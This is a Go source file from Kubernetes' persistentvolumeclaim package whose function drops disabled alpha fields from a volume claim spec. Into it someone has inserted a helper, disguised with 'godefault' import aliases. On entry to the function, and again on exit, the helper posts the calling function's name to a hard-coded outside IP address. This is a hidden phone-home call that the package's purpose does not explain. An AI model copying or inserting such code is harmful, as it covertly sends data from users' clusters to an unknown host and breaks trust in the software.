package persistentvolumeclaim

import (
 utilfeature "k8s.io/apiserver/pkg/util/feature"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/kubernetes/pkg/apis/core"
 "k8s.io/kubernetes/pkg/features"
)

func DropDisabledAlphaFields(pvcSpec *core.PersistentVolumeClaimSpec) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if !utilfeature.DefaultFeatureGate.Enabled(features.BlockVolume) {
  pvcSpec.VolumeMode = nil
 }
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
